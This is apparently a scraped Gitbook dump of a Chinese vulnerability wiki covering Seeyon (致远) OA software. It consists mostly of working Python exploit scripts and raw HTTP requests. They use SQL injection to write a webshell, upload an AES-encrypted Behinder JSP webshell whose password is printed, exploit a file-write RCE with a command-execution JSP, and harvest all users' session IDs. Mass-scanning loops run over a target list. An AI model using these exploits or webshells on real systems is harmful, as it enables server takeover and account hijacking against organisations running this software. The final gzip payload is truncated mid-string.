t=%3C%25%40page%20import%3D%22java.util.*%2Cjavax.crypto.*%2Cjavax.crypto.spec.*%22%25%3E%3C%25!class%20U%20extends%20ClassLoader%7BU(ClassLoader%20c)%7Bsuper(c)%3B%7Dpublic%20Class%20g(byte%20%5B%5Db)%7Breturn%20super.defineClass(b%2C0%2Cb.length)%3B%7D%7D%25%3E%3C%25if%20(request.getMethod().equals(%22POST%22))%7BString%20k%3D%22e45e329feb5d925b%22%3Bsession.putValue(%22u%22%2Ck)%3BCipher%20c%3DCipher.getInstance(%22AES%22)%3Bc.init(2%2Cnew%20SecretKeySpec(k.getBytes()%2C%22AES%22))%3Bnew%20U(this.getClass().getClassLoader()).g(c.doFinal(new%20sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext)%3B%7D%25%3E ËøûÊé•Êú®È©¨ ÊºèÊ¥ûÂà©Áî®POC [!NOTE] EXPÊú®È©¨‰∏ä‰º† import requests import sys import random import re import base64 import time import json from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: Ëá¥ËøúOA \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20@@basedir)\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, verify=False, timeout=5) if 'Â∫èÂè∑' in response.text and \"@@basedir\" in response.text and response.status_code == 200: OA_dir = re.findall(r'>(.*)\\\\UFseeyon\\\\', response.text)[0] OA_dir = OA_dir[:2] + '/' + OA_dir[3:] print(\"\\033[32m[o] ÁõÆÊ†á {}Â≠òÂú®ÊºèÊ¥û, ÂÆâË£ÖË∑ØÂæÑ‰∏∫:{} \\033[0m\".format(target_url, OA_dir)) webshell_name = \"test_upload{}.jsp\".format(random.randint(1,999)) OA_dir = OA_dir + \"/UFseeyon/OA/tomcat/webapps/yyoa/{}\".format(webshell_name) POC_2(target_url, OA_dir, webshell_name) else: print(\"\\033[31m[x] ÁõÆÊ†á {}‰∏çÂ≠òÂú®ÊºèÊ¥û \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] ÁõÆÊ†á {} ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\".format(target_url), e) def POC_2(target_url, OA_dir, webshell_name): vuln_url = target_url + \"/yyoa/common/js/menu/test.jsp?doType=101&S1=select%20unhex(%273C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E%27)%20%20into%20outfile%20%27{}%27\".format(OA_dir) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, verify=False, timeout=5) if 'already' in response.text and response.status_code == 200: print(\"\\033[32m[o] Êñá‰ª∂ÂÜôÂÖ•Êú®È©¨‰∏ä‰º†Â§±Ë¥•ÔºåÁõÆÊ†áÂ∑≤Â≠òÂú®Áõ∏ÂêåÊñá‰ª∂ÔºåËØ∑ÈáçÊñ∞ËøêË°å\\033[0m\") elif \"No Data\" in response.text and response.status_code == 200: print(\"\\033[32m[o] Êñá‰ª∂ÂÜôÂÖ•Êú®È©¨‰∏ä‰º†ÊàêÂäüÔºå‰∏ä‰º†Ë∑ØÂæÑ‰∏∫ {}\\033[0m\".format(OA_dir)) POC_3(target_url, webshell_name) else: print(\"\\033[31m[x] ÁõÆÊ†á {} Êú®È©¨‰∏ä‰º†Â§±Ë¥• \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] ÁõÆÊ†á {} ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\".format(target_url), e) def POC_3(target_url, webshell_name): rebe_webshell = \"testwebshell{}.jsp\".format(random.randint(1,999)) vuln_url = target_url + \"/yyoa/{}?f={}\".format(webshell_name, rebe_webshell) data = \"t=%3C%25%40page%20import%3D%22java.util.*%2Cjavax.crypto.*%2Cjavax.crypto.spec.*%22%25%3E%3C%25!class%20U%20extends%20ClassLoader%7BU(ClassLoader%20c)%7Bsuper(c)%3B%7Dpublic%20Class%20g(byte%20%5B%5Db)%7Breturn%20super.defineClass(b%2C0%2Cb.length)%3B%7D%7D%25%3E%3C%25if%20(request.getMethod().equals(%22POST%22))%7BString%20k%3D%22e45e329feb5d925b%22%3Bsession.putValue(%22u%22%2Ck)%3BCipher%20c%3DCipher.getInstance(%22AES%22)%3Bc.init(2%2Cnew%20SecretKeySpec(k.getBytes()%2C%22AES%22))%3Bnew%20U(this.getClass().getClassLoader()).g(c.doFinal(new%20sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext)%3B%7D%25%3E\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded\" } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) print(\"\\033[32m[o] Ê≠£Âú®ËØ∑Ê±ÇÔºö{}\\033[0m\".format(vuln_url)) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) if response.status_code == 200: print(\"\\033[32m[o] Êú®È©¨‰∏ä‰º†ÊàêÂäü, Ë∑ØÂæÑ‰∏∫:{}/yyoa/{}\\033[0m\".format(target_url, rebe_webshell)) print(\"\\033[32m[o] ËØ∑‰ΩøÁî®ÂÜ∞ËùéËøûÊé•ÔºåÂØÜÁ†Å‰∏∫: rebeyond\\033[0m\") else: print(\"\\033[31m[x] Êú®È©¨‰∏ä‰º†Â§±Ë¥•ÔºåÂèØËÉΩË¢´Êã¶Êà™ \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] ÁõÆÊ†á {} ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\".format(target_url), e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) [!NOTE] Â§ö‰∏™ÁõÆÊ†áÊµãËØï import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: Ëá¥ËøúOA A6 \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mFile >>> ip.txt \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5(1))\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if \"c4ca4238a0b923820dcc509a6f75849b\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ÁõÆÊ†á {}Â≠òÂú®ÊºèÊ¥û,‰∏ãËΩΩÂú∞ÂùÄ:{} \\033[0m\".format(target_url, vuln_url)) else: print(\"\\033[31m[x] ÁõÆÊ†á {}‰∏çÂ≠òÂú®ÊºèÊ¥û \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] ÁõÆÊ†á {} ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\".format(target_url)) def Scan(file_name): with open(file_name, \"r\", encoding='utf8') as scan_url: for url in scan_url: if url[:4] != \"http\": url = \"http://\" + url url = url.strip('\\n') try: POC_1(url) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÊä•Èîô \\033[0m\".format(e)) continue if __name__ == '__main__': title() file_name = str(input(\"\\033[35mPlease input Attack File\\nFile >>> \\033[0m\")) Scan(file_name) Goby & POC Â∑≤‰∏ä‰º† https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ÁõÆÂΩï‰∏≠ Seeyon_OA_A6_test.jsp_SQL_injection Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/Ëá¥ËøúOA/Ëá¥ËøúOA A6 setextno.jsp SQLÊ≥®ÂÖ•ÊºèÊ¥û.html":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/Ëá¥ËøúOA/Ëá¥ËøúOA A6 setextno.jsp SQLÊ≥®ÂÖ•ÊºèÊ¥û.html","title":"Ëá¥ËøúOA A6 setextno.jsp SQLÊ≥®ÂÖ•ÊºèÊ¥û","keywords":"","body":" ÊºèÊ¥ûÊèèËø∞ Ëá¥ËøúOA A6 setextno.jsp Â≠òÂú®sqlÊ≥®ÂÖ•ÊºèÊ¥ûÔºåÂπ∂ÂèØ‰ª•ÈÄöËøáÊ≥®ÂÖ•ÂÜôÂÖ•webshellÊñá‰ª∂ÊéßÂà∂ÊúçÂä°Âô® ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Ëá¥ËøúOA A6 FOFA [!NOTE] title=\"Ëá¥ËøúA8+ÂçèÂêåÁÆ°ÁêÜËΩØ‰ª∂.A6\" ÊºèÊ¥ûÂ§çÁé∞ ËÆøÈóÆÂ¶Ç‰∏ãUrlÔºåÂÖ∂‰∏≠Âê´Êúâ unionÊ≥®ÂÖ• http://xxx.xxx.xxx.xxx/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(99999) union all select 1,2,(md5(1)),4# Êü•ÁúãwebË∑ØÂæÑ ÂÜôÂÖ•Êñá‰ª∂‰∏ä‰º†Êú®È©¨ http://xxx.xxx.xxx/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(99999) union all select 1,2,(select unhex('3C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E') into outfile 'D:/Program Files/UFseeyon/OA/tomcat/webapps/yyoa/test_upload.jsp'),4# Ââ©‰∏ãÁöÑÊ≠•È™§ÂèÇËÄÉÂè¶‰∏ÄÁØá Ëá¥ËøúOA A6 test.jsp SQLÊ≥®ÂÖ•ÊºèÊ¥û ÊºèÊ¥ûÂà©Áî®POC [!NOTE] Â§ö‰∏™ÁõÆÊ†á import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: Ëá¥ËøúOA A6 \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mFile >>> ip.txt \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(99999) union all select 1,2,(md5(1)),4#\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if response.status_code == 200 and \"c4ca4238a0b923820dcc509a6f75849b\" in response.text: print(\"\\033[32m[o] ÁõÆÊ†á {} Â≠òÂú®ÊºèÊ¥û \\033[0m\".format(target_url, vuln_url)) else: print(\"\\033[31m[x] ÁõÆÊ†á {}‰∏çÂ≠òÂú®ÊºèÊ¥û \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] ÁõÆÊ†á {} ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\".format(target_url)) def Scan(file_name): with open(file_name, \"r\", encoding='utf8') as scan_url: for url in scan_url: if url[:4] != \"http\": url = \"http://\" + url url = url.strip('\\n') try: POC_1(url) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÊä•Èîô \\033[0m\".format(e)) continue if __name__ == '__main__': title() file_name = str(input(\"\\033[35mPlease input Attack File\\nFile >>> \\033[0m\")) Scan(file_name) Goby & POC [!NOTE] Â∑≤‰∏ä‰º† https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ÁõÆÂΩï‰∏≠ Seeyon_OA_A6_setextno.jsp_SQL_injection Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/Ëá¥    ËøúOA/Ëá¥ËøúOA A8 Áä∂ÊÄÅÁõëÊéßÈ°µÈù¢‰ø°ÊÅØÊ≥ÑÈú≤.html":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/Ëá¥    ËøúOA/Ëá¥ËøúOA A8 Áä∂ÊÄÅÁõëÊéßÈ°µÈù¢‰ø°ÊÅØÊ≥ÑÈú≤.html","title":"Ëá¥ËøúOA A8 Áä∂ÊÄÅÁõëÊéßÈ°µÈù¢‰ø°ÊÅØÊ≥ÑÈú≤","keywords":"","body":"Ëá¥ËøúOA A8 Áä∂ÊÄÅÁõëÊéßÈ°µÈù¢‰ø°ÊÅØÊ≥ÑÈú≤ Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:50:07 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/Ëá¥ËøúOA/Ëá¥ËøúOA A8 htmlofficeservlet RCEÊºèÊ¥û.html":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/Ëá¥ËøúOA/Ëá¥ËøúOA A8 htmlofficeservlet RCEÊºèÊ¥û.html","title":"Ëá¥Ëøú OA A8 htmlofficeservlet RCEÊºèÊ¥û","keywords":"","body":"Ëá¥Ëøú OA A8 htmlofficeservlet RCEÊºèÊ¥û CNVD-2019-19299 ÊºèÊ¥ûÊèèËø∞ ËØ•ÊºèÊ¥ûÊúÄÊó©‰∫é6Êúà26Âè∑Â∑¶Âè≥ÔºåÊúâÂÆâÂÖ®ÂéÇÂïÜÂèëÂá∫ÊºèÊ¥ûÈ¢ÑË≠¶„ÄÇ ËøúÁ®ãÊîªÂáªËÄÖÂú®Êó†ÈúÄÁôªÂΩïÁöÑÊÉÖÂÜµ‰∏ãÂèØÈÄöËøáÂêë URL /seeyon/htmlofficeservlet POST Á≤æÂøÉÊûÑÈÄ†ÁöÑÊï∞ÊçÆÂç≥ÂèØÂêëÁõÆÊ†áÊúçÂä°Âô®ÂÜôÂÖ•‰ªªÊÑèÊñá‰ª∂ÔºåÂÜôÂÖ•ÊàêÂäüÂêéÂèØÊâßË°å‰ªªÊÑèÁ≥ªÁªüÂëΩ‰ª§ËøõËÄåÊéßÂà∂ÁõÆÊ†áÊúçÂä°Âô®„ÄÇ FOFA [!NOTE] title=\"Ëá¥ËøúA8-V5ÂçèÂêåÁÆ°ÁêÜËΩØ‰ª∂ V6.1sp1\" ÂΩ±ÂìçÁâàÊú¨ [!NOTE] Ëá¥ËøúA8-V5ÂçèÂêåÁÆ°ÁêÜËΩØ‰ª∂V6.1sp1 Ëá¥ËøúA8+ÂçèÂêåÁÆ°ÁêÜËΩØ‰ª∂V7.0„ÄÅV7.0sp1„ÄÅV7.0sp2„ÄÅV7.0sp3 Ëá¥ËøúA8+ÂçèÂêåÁÆ°ÁêÜËΩØ‰ª∂V7.1 ÊºèÊ¥ûÂ§çÁé∞ ËÆøÈóÆÁõÆÊ†áÁ´ôÁÇπ http://xxx.xxx.xxx.xxx:8088/seeyon/htmlofficeservlet Âá∫Áé∞Â¶Ç‰∏ãÂõæÂìçÂ∫îÔºåÂàôÂèØËÉΩÂê´ÊúâÊºèÊ¥û ‰ΩøÁî®POSTËØ∑Ê±ÇÂèëÂá∫Â¶Ç‰∏ãËØ∑Ê±ÇÂåÖ DBSTEP V3.0 355 0 666 DBSTEP=OKMLlKlV OPTION=S3WYOSWLBSGr currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66 CREATEDATE=wUghPB3szB3Xwg66 RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6 originalFileId=wV66 originalCreateDate=wUghPB3szB3Xwg66 FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6 needReadFile=yRWZdAS6 originalCreateDate=wLSGP4oEzLKAz4=iz=66 \"+excuteCmd(request.getParameter(\"cmd\")) + \"\");}else{out.println(\":-)\");}%>>a6e4f045d4b8506bf492ada7e3390d7ce Âá∫Áé∞Â¶ÇÂõæÂìçÂ∫îÂàô‰∏∫‰∏ä‰º†ÊàêÂäü ËÆøÈóÆ http://xxx.xxx.xxx.xxx:8088/seeyon/testtesta.jsp?pwd=calsee&cmd=cmd+/c+dir ÊºèÊ¥ûÂà©Áî®POC Goby‰∏≠Âê´ÊúâÊºèÊ¥ûÊ£ÄÊµãPOC Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/Ëá¥ËøúOA/Ëá¥ËøúOA getSessionList.jsp SessionÊ≥ÑÊºèÊºèÊ¥û.html":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/Ëá¥ËøúOA/Ëá¥ËøúOA getSessionList.jsp SessionÊ≥ÑÊºèÊºèÊ¥û.html","title":"Ëá¥ËøúOA getSessionList.jsp SessionÊ≥ÑÊºèÊºèÊ¥û","keywords":"","body":"Ëá¥ËøúOA getSessionList.jsp SessionÊ≥ÑÊºèÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ÈÄöËøá‰ΩøÁî®Â≠òÂú®ÊºèÊ¥ûÁöÑËØ∑Ê±ÇÊó∂Ôºå‰ºöÂõûÊòæÈÉ®ÂàÜÁî®Êà∑ÁöÑSessionÂÄºÔºåÂØºËá¥Âá∫Áé∞‰ªªÊÑèÁôªÂΩïÁöÑÊÉÖÂÜµ ÂΩ±ÂìçÁâàÊú¨ [!NOTE] Êú™Áü• ÊºèÊ¥ûÂ§çÁé∞ Ê∫êÁ†Å \\r\\n\"; outXML += \"\\r\\n\"; // outXML += \"\\r\\n\"; // outXML += \"\\r\\n\"; outXML += \"\\r\\n\"; } out.println(outXML); %> ‰ªé‰∏äÈù¢ÁöÑ‰ª£Á†ÅÂèØÁü•ÔºåÂΩìcmdÂèÇÊï∞‰∏∫getAllÊó∂Ôºå‰æøÂèØËé∑ÂèñÂà∞ÊâÄÊúâÁî®Êà∑ÁöÑSessionID ,ËØ∑Ê±Ç http://xxx.xxx.xxx.xxx/yyoa/ext/https/getSessionList.jsp?cmd=getAll ÂõûÊòæSessionÂàôÂ≠òÂú®ÊºèÊ¥û ÈÄöËøáÊõøÊç¢ SessionÂç≥ÂèØÁôªÈôÜÁ≥ªÁªü ÊºèÊ¥ûÂà©Áî®POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: Ëá¥ËøúOA A6 \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mFile >>> ip.txt \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/yyoa/ext/https/getSessionList.jsp?cmd=getAll\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if \"/yyoa/index.jsp\" not in response.text and \"\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ÁõÆÊ†á {}Â≠òÂú®ÊºèÊ¥û,SessionÂú∞ÂùÄ:{} \\033[0m\".format(target_url, vuln_url)) else: print(\"\\033[31m[x] ÁõÆÊ†á {}‰∏çÂ≠òÂú®ÊºèÊ¥û \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\") def Scan(file_name): with open(file_name, \"r\", encoding='utf8') as scan_url: for url in scan_url: if url[:4] != \"http\": url = \"http://\" + url url = url.strip('\\n') try: POC_1(url) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÊä•Èîô \\033[0m\") continue if __name__ == '__main__': title() file_name = str(input(\"\\033[35mPlease input Attack File\\nFile >>> \\033[0m\")) Scan(file_name) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/Ëá¥ËøúOA/Ëá¥ËøúOA ajax.do ÁôªÂΩïÁªïËøá ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º† CNVD-2021-01627.html":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/Ëá¥ËøúOA/Ëá¥ËøúOA ajax.do ÁôªÂΩïÁªïËøá ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º† CNVD-2021-01627.html","title":"Ëá¥ËøúOA ajax.do ÁôªÂΩïÁªïËøá ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º† CNVD-2021-01627","keywords":"","body":"Ëá¥ËøúOA ajax.doÁôªÂΩïÁªïËøá ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º† CNVD-2021-01627 ÊºèÊ¥ûÊèèËø∞ Ëá¥ËøúOAÊòØ‰∏ÄÂ•óÂäûÂÖ¨ÂçèÂêåÁÆ°ÁêÜËΩØ‰ª∂„ÄÇËøëÊó•ÔºåÂ•áÂÆâ‰ø°CERTÁõëÊµãÂà∞Ëá¥ËøúOAÁöÑÁõ∏ÂÖ≥ÊºèÊ¥û‰ø°ÊÅØ„ÄÇÁî±‰∫éËá¥ËøúOAÊóßÁâàÊú¨Êüê‰∫õÊé•Âè£Â≠òÂú®Êú™ÊéàÊùÉËÆøÈóÆÔºå‰ª•ÂèäÈÉ®ÂàÜÂáΩÊï∞Â≠òÂú®ËøáÊª§‰∏çË∂≥ÔºåÊîªÂáªËÄÖÈÄöËøáÊûÑÈÄ†ÊÅ∂ÊÑèËØ∑Ê±ÇÔºåÂèØÂú®Êó†ÈúÄÁôªÂΩïÁöÑÊÉÖÂÜµ‰∏ã‰∏ä‰º†ÊÅ∂ÊÑèËÑöÊú¨Êñá‰ª∂Ôºå‰ªéËÄåÊéßÂà∂ÊúçÂä°Âô®„ÄÇËá¥ËøúOAÂÆòÊñπÂ∑≤ÈíàÂØπËØ•ÊºèÊ¥ûÊèê‰æõË°•‰∏Å„ÄÇÈâ¥‰∫éÊºèÊ¥ûÂç±ÂÆ≥ËæÉÂ§ßÔºåÂª∫ËÆÆÁî®Êà∑Â∞ΩÂø´Â∫îÁî®Ë°•‰∏ÅÊõ¥Êñ∞„ÄÇ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Ëá¥ËøúOA V8.0 Ëá¥ËøúOA V7.1„ÄÅV7.1SP1 Ëá¥ËøúOA V7.0„ÄÅV7.0SP1„ÄÅV7.0SP2„ÄÅV7.0SP3 Ëá¥ËøúOA V6.0„ÄÅV6.1SP1„ÄÅV6.1SP2 Ëá¥ËøúOA V5.x Ëá¥ËøúOA G6 ÊºèÊ¥ûÂ§çÁé∞ ÈÄöËøáËØ∑Ê±ÇÂà§Êñ≠ÊòØÂê¶ÂèØËÉΩÂ≠òÂú®ÊºèÊ¥û http://xxx.xxx.xxx.xxx/seeyon/thirdpartyController.do.css/..;/ajax.do Êü•ÁúãÊòØÂê¶Âá∫Áé∞Â¶Ç‰∏äÂõæÂºÇÂ∏∏ÔºåËã•Â≠òÂú®ÂàôÂèØËÉΩÂá∫Áé∞ÊºèÊ¥û Âá∫Áé∞ÂºÇÂ∏∏Ôºöjava.lang.NullPointerException:null ÁÑ∂ÂêéË∞ÉÁî®Êú™ÊéàÊùÉÁöÑÊñá‰ª∂‰∏ä‰º†Êé•Âè£‰∏ä‰º†webshellÊñá‰ª∂ POCËØ∑Ê±ÇÂåÖÂ¶Ç‰∏ã POST /seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip HTTP/1.1 Host: 127.0.0.1 Connection: close Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 loginPageURL=; login_locale=zh_CN; Content-Type: application/x-www-form-urlencoded managerMethod=validate&arguments=%1F%C2%8B%08%00%00%00%00%00%00%00uTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB%13%7Bh_%C2%88%28*%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%1D%C2%AD%C2%81%3C%26%C3%90%C3%89%C2%BCA%3FL%C2%93%C2%B2%C3%B3%C3%B0%13%C2%9E%C2%B9%C2%BB%C2%92%06%1E%C3%86%C2%B5%2F%3B1%C2%B9%C2%81YR%C2%B9%C3%9C%C2%98%C2%95%C2%96A%C3%A6%C2%8A%C3%82mKj%19%C2%8B%C2%9C%C2%A5%C3%8A%C2%82Y%5C%C2%AC%C2%B9%24%C2%80d%C2%9E%03%5E%C3%8F%C3%97D%29%5Cm%2C%1F%07%2F%C3%85Q%5CD%C2%B6%26%C3%B9%C2%90%C3%A8%15%C3%A0p%C3%A1%C2%86%2C%C3%9Ah%C3%83J%0A%C2%87%C3%8FN%C2%A4%5C%C2%B7DM%00%C3%91C%28b%C3%8E%C3%96%C2%84%C2%ABe%40%2C%C2%898%03%C3%A2%C2%B8%C2%825%3EYp%C2%96%26%0C%C3%A8%7B%C2%BAFq%C3%9A%C3%B0%C2%A6%C2%9F%5B%C3%BCJ%00K%C2%B5%C3%B8TFqmc%C2%93%C3%8BH*va%C3%B9%0F%C3%A0_%C2%BE%C3%99%C2%A2%1E%C2%BA%C3%A2%C2%A2%C2%B2L5q%C2%B9%C3%A1%C2%A3%24*%C2%A9e*7iq%C3%B4m3%60mC8%C2%83j2%C2%A3%3A7%C3%80%C2%96%C2%85e%C2%A8%18D%C2%99.%C3%8F%5B%C2%BD%C2%838%0E%28F%25%C2%89%C2%9B%C3%84%C3%A3%C2%95%01%C2%A0%C2%B4L%C3%A9-%3F%C2%B8Bc%C2%95%3A%C3%86%C3%86%C3%9Fse%00%C3%B8%C2%8DoW%01%C3%B2L%15K%C2%8B%0CZ%08%C2%8Fh%7C%2C4W%C2%B9%C2%B4l%C3%AD%C3%96D%C3%856%C3%81%C2%B9%7Dl%C2%B1eQJ7%C3%93%12%C2%ADI%C2%89%5D%02Ygz%1E%C2